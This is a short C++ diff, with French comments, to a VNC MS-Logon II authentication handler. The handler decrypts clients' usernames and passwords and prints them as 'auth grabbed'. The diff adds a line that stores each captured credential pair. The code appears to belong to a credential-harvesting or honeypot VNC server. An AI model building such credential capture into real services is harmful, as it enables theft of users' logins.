@@ -9,7 +9,7 @@ extern "C"{
 #include "msAuth.h"
 #include "serviceCore.h"
 
-// msAuthServiceCorePtr: Pointeur vers le ServiceCore utilisé par msAuthIIHandler pour connaitre la AuthResponse
+// msAuthServiceCorePtr: Pointeur vers le ServiceCore utilisé par msAuthIIHandler pour connaitre la AuthResponse et pouvoir stocker les creds
 ServiceCore *msAuthServiceCorePtr = NULL;
 
 /* vncDecryptBytes: Dechifre les donnée à l'aide de l'algorithme du vnc, dérivé de DES
@@ -64,6 +64,7 @@ void msAuthIIHandler(rfbClientRec *client){
 	password[53] = '\0';
 
 	std::cout << "[msAuthIIHandler] New auth grabbed " << username << ":" << password << std::endl;
+	msAuthServiceCorePtr->pushCred(username, password);
 
 	// On accepte ou non la connection
 	uint32_t authResult = msAuthServiceCorePtr->getAuthresponse();
